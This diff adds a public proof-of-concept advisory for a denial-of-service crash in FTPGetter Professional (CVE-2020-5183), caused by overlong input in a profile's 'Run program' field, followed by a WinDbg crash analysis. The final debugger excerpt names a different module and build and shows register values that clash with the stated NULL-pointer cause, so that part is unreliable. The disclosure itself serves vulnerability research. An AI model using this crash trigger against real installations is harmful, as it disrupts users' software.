@@ -1,0 +1,153 @@
+# Exploit Title: FTPGetter Professional 5.97.0.223 -  Denial of Service (PoC)
+# Google Dork: N/A
+# Date: 2020-01-03
+# Exploit Author: FULLSHADE
+# Vendor Homepage: https://www.ftpgetter.com/
+# Software Link: https://www.ftpgetter.com/ftpgetter_pro_setup.exe
+# Version: v.5.97.0.223
+# Tested on: Windows 7
+# CVE : N/A
+
+==================================================================
+THE BUG : NULL pointer dereference -> DOS crash
+==================================================================
+
+The FTPGetter Professional v.5.97.0.223 FTP client suffers from a
+NULL pointer dereference vulnerability via the program not properly
+handling user input when setting the field "Run program" under
+profile properties, it triggers when executing the profile.
+
+==================================================================
+DISCLOSURE : Vendor contacted : MITRE assignment : CVE-2020-5183
+==================================================================
+...
+...
+==================================================================
+WINDBG ANALYSIS AFTER SENDING 50,000 'A' BYTES
+==================================================================
+
+(b84.e88): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=0255d3a0 ecx=04000000 edx=00000030 esi=00000000 edi=00000001
+eip=00855994 esp=0012fbd0 ebp=0012fc6c iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for FTPGetter.exe -
+FTPGetter!Xtermforminitialization$qqrv+0x202d74:
+00855994 8b5004          mov     edx,dword ptr [eax+4] ds:0023:00000004=????????
+
+0:000> !analyze -v
+*******************************************************************************
+*                                                                             *
+*                        Exception Analysis                                   *
+*                                                                             *
+*******************************************************************************
+
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for ftpgcore.dll -
+Failed calling InternetOpenUrl, GLE=12007
+
+FAULTING_IP:
+FTPGetter!Xtermforminitialization$qqrv+202d74
+00855994 8b5004          mov     edx,dword ptr [eax+4]
+
+EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
+ExceptionAddress: 00855994 (FTPGetter!Xtermforminitialization$qqrv+0x00202d74)
+   ExceptionCode: c0000005 (Access violation)
+  ExceptionFlags: 00000000
+NumberParameters: 2
+   Parameter[0]: 00000000
+   Parameter[1]: 00000004
+Attempt to read from address 00000004
+
+FAULTING_THREAD:  00000e88
+
+PROCESS_NAME:  FTPGetter.exe
+
+ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.
+
+EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.
+
+EXCEPTION_PARAMETER1:  00000000
+
+EXCEPTION_PARAMETER2:  00000004
+
+READ_ADDRESS:  00000004
+
+FOLLOWUP_IP:
+FTPGetter!Xtermforminitialization$qqrv+202d74
+00855994 8b5004          mov     edx,dword ptr [eax+4]
+
+MOD_LIST: <ANALYSIS/>
+
+NTGLOBALFLAG:  0
+
+APPLICATION_VERIFIER_FLAGS:  0
+
+BUGCHECK_STR:  APPLICATION_FAULT_NULL_CLASS_PTR_DEREFERENCE_NULL_POINTER_READ_INVALID_POINTER_READ
+
+PRIMARY_PROBLEM_CLASS:  NULL_CLASS_PTR_DEREFERENCE
+
+DEFAULT_BUCKET_ID:  NULL_CLASS_PTR_DEREFERENCE
+
+LAST_CONTROL_TRANSFER:  from 00812591 to 00855994
+
+STACK_TEXT:
+WARNING: Stack unwind information not available. Following frames may be wrong.
+0012fc6c 00812591 0085d350 0085d355 0046d181 FTPGetter!Xtermforminitialization$qqrv+0x202d74
+0012fc8c 0079ffc1 0012fd24 00000000 007a15c2 FTPGetter!Xtermforminitialization$qqrv+0x1bf971
+0012fcf8 007a2780 0012fdc8 007a278a 0012fd1c FTPGetter!Xtermforminitialization$qqrv+0x14d3a1
+0012fd1c 0068fda6 00000111 00000030 00000000 FTPGetter!Xtermforminitialization$qqrv+0x14fb60
+0012fd34 7688c267 001f0320 00000111 00000030 FTPGetter!Xtermforminitialization$qqrv+0x3d186
+0012fd60 7688c367 00250f60 001f0320 00000111 user32!InternalCallWinProc+0x23
+0012fdd8 7688c999 00000000 00250f60 001f0320 user32!UserCallWinProcCheckWow+0x14b
+0012fe38 7688c9f0 00250f60 00000000 001f0320 user32!DispatchMessageWorker+0x357
+0012fe48 007dec94 0012fe6c 00120100 0012feb8 user32!DispatchMessageW+0xf
+0012fe64 007decd7 001f0320 00000111 00000030 FTPGetter!Xtermforminitialization$qqrv+0x18c074
+0012fe88 007df016 0012fe9c 007df020 0012feb8 FTPGetter!Xtermforminitialization$qqrv+0x18c0b7
+0012feb8 00404674 00000000 00e75048 015c26bb FTPGetter!Xtermforminitialization$qqrv+0x18c3f6
+0012ff50 00aeae2b 00400000 00000000 015c26bb FTPGetter!_GetExceptDLLinfo+0x112f
+0012ff88 7509ef3c 7ffdc000 0012ffd4 77003688 FTPGetter!madTraceProcess+0x3cef7
+0012ff94 77003688 7ffdc000 7702d7f0 00000000 kernel32!BaseThreadInitThunk+0xe
+0012ffd4 7700365b 004034ec 7ffdc000 00000000 ntdll!__RtlUserThreadStart+0x70
+0012ffec 00000000 004034ec 7ffdc000 00000000 ntdll!_RtlUserThreadStart+0x1b
+
+SYMBOL_STACK_INDEX:  0
+
+SYMBOL_NAME:  ftpgetter!Xtermforminitialization$qqrv+202d74
+
+FOLLOWUP_NAME:  MachineOwner
+
+MODULE_NAME: FTPGetter
+
+IMAGE_NAME:  FTPGetter.exe
+
+DEBUG_FLR_IMAGE_TIMESTAMP:  5dffa0bd
+
+STACK_COMMAND:  dt ntdll!LdrpLastDllInitializer BaseDllName ; dt ntdll!LdrpFailureData ; ~0s ; kb
+
+FAILURE_BUCKET_ID:  NULL_CLASS_PTR_DEREFERENCE_c0000005_FTPGetter.exe!Xtermforminitialization$qqrv
+
+BUCKET_ID:  APPLICATION_FAULT_NULL_CLASS_PTR_DEREFERENCE_NULL_POINTER_READ_INVALID_POINTER_READ_ftpgetter!Xtermforminitialization$qqrv+202d74
+
+WATSON_STAGEONE_URL:  http://watson.microsoft.com/StageOne/FTPGetter_exe/5_97_0_221/5dffa0bd/FTPGetter_exe/5_97_0_221/5dffa0bd/c0000005/00455994.htm?Retriage=1
+
+Followup: MachineOwner
+---------
+
+NULL pointer
+
+FOLLOWUP_IP:
+REDftp!Xtermforminitialization$qqrv+202d74
+00855994 8b5004          mov     edx,dword ptr [eax+4]
+
+Stepping into and running
+
+eax=04e8fc78 ebx=004db6b4 ecx=0000000a edx=41414141 esi=02871ae0 edi=00000000
+eip=004db97a esp=04e8fc74 ebp=04e8fec0 iopl=0         nv up ei pl nz ac pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010216
+REDftp!GetFTPValidationW+0x6e842:
+004db97a 837a5400        cmp     dword ptr [edx+54h],0 ds:0023:41414195=????????
+
+==================================================================
+CVE-2020-5183 is a NULL pointer dereference vulnerability
+==================================================================
